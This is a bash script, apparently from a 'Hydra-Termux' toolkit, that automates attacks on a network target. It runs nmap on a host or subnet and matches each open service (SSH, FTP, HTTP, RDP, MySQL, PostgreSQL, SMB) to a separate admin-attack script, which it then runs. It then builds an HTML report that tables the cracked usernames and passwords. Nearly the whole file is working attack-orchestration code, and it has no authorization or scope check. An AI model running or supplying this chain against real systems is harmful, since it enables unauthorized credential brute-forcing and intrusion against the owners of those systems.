#!/bin/bash

# Multi-Protocol Auto Attack Script
# Automated reconnaissance and attack chain

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source logger
source "$SCRIPT_DIR/logger.sh"

# Default configuration
TARGET=""
SCAN_TYPE="fast"
OUTPUT_DIR="$PROJECT_ROOT/results"
REPORT_FILE=""

# Service to script mapping
declare -A SERVICE_SCRIPTS=(
    ["ssh"]="ssh_admin_attack.sh"
    ["ftp"]="ftp_admin_attack.sh"
    ["http"]="web_admin_attack.sh"
    ["https"]="web_admin_attack.sh"
    ["rdp"]="rdp_admin_attack.sh"
    ["mysql"]="mysql_admin_attack.sh"
    ["postgresql"]="postgres_admin_attack.sh"
    ["smb"]="smb_admin_attack.sh"
    ["microsoft-ds"]="smb_admin_attack.sh"
)

# Function to display help
show_help() {
    print_banner "Multi-Protocol Auto Attack Script"
    echo ""
    echo "Usage: $0 -t TARGET [OPTIONS]"
    echo ""
    echo "Required:"
    echo "  -t, --target      Target IP address or hostname"
    echo ""
    echo "Optional:"
    echo "  -s, --scan-type   Nmap scan type: fast, full, aggressive (default: fast)"
    echo "  -o, --output      Output directory for results (default: ./results)"
    echo "  -r, --report      Generate HTML report"
    echo "  -v, --verbose     Verbose output"
    echo "  -h, --help        Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 -t 192.168.1.100"
    echo "  $0 -t 192.168.1.0/24 -s full -r"
    echo ""
}

# Function to validate input
validate_input() {
    if [ -z "$TARGET" ]; then
        log_error "Target is required"
        show_help
        exit 1
    fi
    
    if ! command -v nmap &> /dev/null; then
        log_error "Nmap is not installed. Please run install.sh first"
        exit 1
    fi
    
    mkdir -p "$OUTPUT_DIR"
}

# Function to scan target
scan_target() {
    print_header "Port Scanning"
    log_info "Scanning target: $TARGET"
    
    local scan_opts=""
    case "$SCAN_TYPE" in
        fast)
            scan_opts="-F -T4"
            ;;
        full)
            scan_opts="-p- -T4"
            ;;
        aggressive)
            scan_opts="-A -T4"
            ;;
    esac
    
    local scan_file="$OUTPUT_DIR/nmap_${TARGET//[.\/]/_}.xml"
    
    log_progress "Running nmap scan..."
    nmap $scan_opts -sV -oX "$scan_file" "$TARGET" 2>&1 | while IFS= read -r line; do
        [ "$VERBOSE" = "true" ] && echo "$line"
    done
    
    if [ ! -f "$scan_file" ]; then
        log_error "Scan failed"
        return 1
    fi
    
    log_success "Scan completed: $scan_file"
    echo "$scan_file"
}

# Function to parse scan results
parse_scan_results() {
    local scan_file="$1"
    
    print_header "Analyzing Scan Results"
    
    # Extract open ports and services
    local services=$(grep -oP 'portid="\K[0-9]+(?=")' "$scan_file" 2>/dev/null | sort -n)
    
    if [ -z "$services" ]; then
        log_warning "No open ports found"
        return 1
    fi
    
    log_success "Found open ports:"
    
    # Parse services
    declare -gA DISCOVERED_SERVICES
    
    while IFS= read -r port; do
        local service=$(grep "portid=\"$port\"" "$scan_file" | grep -oP 'name="\K[^"]+' | head -1)
        
        if [ -n "$service" ]; then
            DISCOVERED_SERVICES["$port"]="$service"
            log_info "  Port $port: $service"
        fi
    done <<< "$services"
}

# Function to attack service
attack_service() {
    local port="$1"
    local service="$2"
    
    print_header "Attacking $service on port $port"
    
    # Find matching attack script
    local script=""
    for svc in "${!SERVICE_SCRIPTS[@]}"; do
        if [[ "$service" == *"$svc"* ]]; then
            script="${SERVICE_SCRIPTS[$svc]}"
            break
        fi
    done
    
    if [ -z "$script" ]; then
        log_warning "No attack script available for $service"
        return 1
    fi
    
    if [ ! -f "$SCRIPT_DIR/$script" ]; then
        log_warning "Attack script not found: $script"
        return 1
    fi
    
    log_info "Using attack script: $script"
    
    # Run attack script
    bash "$SCRIPT_DIR/$script" -t "$TARGET" -p "$port" 2>&1 | while IFS= read -r line; do
        [ "$VERBOSE" = "true" ] && echo "$line"
    done
    
    return $?
}

# Function to generate report
generate_report() {
    local scan_file="$1"
    local report_file="$OUTPUT_DIR/report_$(date +%Y%m%d_%H%M%S).html"
    
    print_header "Generating Report"
    
    cat > "$report_file" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Hydra-Termux Attack Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 3px solid #007bff; padding-bottom: 10px; }
        h2 { color: #555; margin-top: 30px; }
        .success { color: green; font-weight: bold; }
        .warning { color: orange; }
        .error { color: red; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #007bff; color: white; }
        .timestamp { color: #888; font-size: 0.9em; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🐍 Hydra-Termux Attack Report</h1>
        <p class="timestamp">Generated: $(date)</p>
        <p><strong>Target:</strong> $TARGET</p>
        
        <h2>Discovered Services</h2>
        <table>
            <tr><th>Port</th><th>Service</th><th>Status</th></tr>
EOF
    
    for port in "${!DISCOVERED_SERVICES[@]}"; do
        local service="${DISCOVERED_SERVICES[$port]}"
        echo "<tr><td>$port</td><td>$service</td><td class=\"success\">Open</td></tr>" >> "$report_file"
    done
    
    cat >> "$report_file" << 'EOF'
        </table>
        
        <h2>Attack Results</h2>
EOF
    
    # Add results from JSON file
    local results_file="$PROJECT_ROOT/logs/results_$(date +%Y%m%d).json"
    if [ -f "$results_file" ]; then
        echo "<table><tr><th>Protocol</th><th>Username</th><th>Password</th><th>Port</th></tr>" >> "$report_file"
        
        jq -r '.[] | "<tr><td>\(.protocol)</td><td>\(.username)</td><td>\(.password)</td><td>\(.port)</td></tr>"' "$results_file" >> "$report_file" 2>/dev/null || true
        
        echo "</table>" >> "$report_file"
    else
        echo "<p class=\"warning\">No successful attacks recorded</p>" >> "$report_file"
    fi
    
    cat >> "$report_file" << 'EOF'
    </div>
</body>
</html>
EOF
    
    log_success "Report generated: $report_file"
    REPORT_FILE="$report_file"
}

# Function to run auto attack
run_auto_attack() {
    print_banner "Starting Auto Attack"
    echo ""
    
    # Step 1: Scan target
    local scan_file=$(scan_target)
    if [ -z "$scan_file" ]; then
        log_error "Scanning failed"
        return 1
    fi
    
    # Step 2: Parse results
    parse_scan_results "$scan_file"
    
    if [ ${#DISCOVERED_SERVICES[@]} -eq 0 ]; then
        log_error "No services discovered"
        return 1
    fi
    
    # Step 3: Attack each service
    local success_count=0
    local total_count=${#DISCOVERED_SERVICES[@]}
    
    for port in "${!DISCOVERED_SERVICES[@]}"; do
        local service="${DISCOVERED_SERVICES[$port]}"
        
        attack_service "$port" "$service"
        if [ $? -eq 0 ]; then
            success_count=$((success_count + 1))
        fi
        
        # Small delay between attacks
        sleep 2
    done
    
    # Step 4: Generate report
    print_header "Attack Summary"
    log_info "Total services attacked: $total_count"
    log_info "Successful attacks: $success_count"
    
    if [ "$GENERATE_REPORT" = "true" ]; then
        generate_report "$scan_file"
    fi
}

# Parse command line arguments
VERBOSE=false
GENERATE_REPORT=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET="$2"
            shift 2
            ;;
        -s|--scan-type)
            SCAN_TYPE="$2"
            shift 2
            ;;
        -o|--output)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        -r|--report)
            GENERATE_REPORT=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution
validate_input
run_auto_attack
exit_code=$?

rotate_logs
exit $exit_code
